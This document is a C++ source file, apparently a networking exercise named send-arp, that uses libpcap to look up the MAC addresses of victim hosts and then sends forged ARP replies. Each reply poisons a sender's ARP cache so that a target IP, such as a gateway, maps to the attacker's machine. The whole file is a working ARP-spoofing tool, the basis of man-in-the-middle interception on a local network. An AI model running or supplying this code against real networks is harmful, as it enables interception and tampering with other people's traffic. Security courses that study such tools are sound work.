#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>

#define PACKET_SIZE 42

struct EthArpPacket
{
    struct ether_header eth_;
    struct ether_arp arp_;
};

void usage()
{
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void my_mac_addr(const char *dev, uint8_t *mac_addr)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0)
    {
        perror("socket");
        exit(1);
    }
    struct ifreq ifr;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
    {
        perror("ioctl");
        close(fd);
        exit(1);
    }
    close(fd);
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);
}

void my_ip_addr(const char *dev, char *ip_addr)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0)
    {
        perror("socket");
        exit(1);
    }
    struct ifreq ifr;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0)
    {
        perror("ioctl");
        close(fd);
        exit(1);
    }
    close(fd);
    strcpy(ip_addr, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}

void eth_arp_packet(EthArpPacket *packet, uint8_t *src_mac, uint8_t *dst_mac, const char *src_ip, const char *dst_ip, int op)
{
    memcpy(packet->eth_.ether_shost, src_mac, 6);
    memcpy(packet->eth_.ether_dhost, dst_mac, 6);
    packet->eth_.ether_type = htons(ETHERTYPE_ARP);

    packet->arp_.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    packet->arp_.ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    packet->arp_.ea_hdr.ar_hln = 6;
    packet->arp_.ea_hdr.ar_pln = 4;
    packet->arp_.ea_hdr.ar_op = htons(op);

    memcpy(packet->arp_.arp_sha, src_mac, 6);
    inet_pton(AF_INET, src_ip, packet->arp_.arp_spa);
    memcpy(packet->arp_.arp_tha, dst_mac, 6);
    inet_pton(AF_INET, dst_ip, packet->arp_.arp_tpa);
}

void send_arp_req(pcap_t *handle, const char *my_ip, uint8_t *my_mac, const char *target_ip, uint8_t *target_mac)
{
    EthArpPacket packet;
    eth_arp_packet(&packet, my_mac, target_mac, my_ip, target_ip, ARPOP_REQUEST);
    if (pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), PACKET_SIZE) != 0)
    {
        perror("pcap_sendpacket");
        exit(1);
    }
}

void send_arp_reply(pcap_t *handle, const char *sender_ip, uint8_t *sender_mac, const char *target_ip, uint8_t *my_mac)
{
    EthArpPacket packet;
    eth_arp_packet(&packet, my_mac, sender_mac, target_ip, sender_ip, ARPOP_REPLY);
    if (pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), PACKET_SIZE) != 0)
    {
        perror("pcap_sendpacket");
        exit(1);
    }
}

void get_mac(pcap_t *handle, uint8_t *my_mac, const char *my_ip, const char *target_ip, uint8_t *target_mac)
{
    uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    send_arp_req(handle, my_ip, my_mac, target_ip, broadcast_mac);

    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *reply_packet;
        int res = pcap_next_ex(handle, &header, &reply_packet);
        if (res == 0)
            continue;
        if (res == -1 || res == -2)
            break;

        EthArpPacket *packet = (EthArpPacket *)reply_packet;
        if (ntohs(packet->eth_.ether_type) == ETHERTYPE_ARP &&
            ntohs(packet->arp_.ea_hdr.ar_op) == ARPOP_REPLY)
        {
            uint32_t packet_spa;
            inet_pton(AF_INET, target_ip, &packet_spa);
            if (memcmp(packet->arp_.arp_spa, &packet_spa, 4) == 0)
            {
                memcpy(target_mac, packet->arp_.arp_sha, 6);
                break;
            }
        }
    }
}

int main(int argc, char *argv[])
{
    if (argc < 4 || argc % 2 != 0)
    {
        usage();
        return -1;
    }
    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr)
    {
        perror("pcap_open_live");
        return -1;
    }

    uint8_t my_mac[6];
    char my_ip[16];
    my_mac_addr(dev, my_mac);
    my_ip_addr(dev, my_ip);

    for (int i = 2; i < argc; i += 2)
    {
        const char *sender_ip = argv[i];
        const char *target_ip = argv[i + 1];
        uint8_t sender_mac[6];
        uint8_t target_mac[6];

        // Get the MAC address of the sender
        get_mac(handle, my_mac, my_ip, sender_ip, sender_mac);

        // Get the MAC address of the target
        get_mac(handle, my_mac, my_ip, target_ip, target_mac);

        // Send ARP reply
        send_arp_reply(handle, sender_ip, sender_mac, target_ip, my_mac);

        printf("Sender MAC: ");
        for (int j = 0; j < 6; j++)
        {
            printf("%02x%c", sender_mac[j], (j < 5) ? ':' : '\n');
        }
    }

    pcap_close(handle);
    return 0;
}

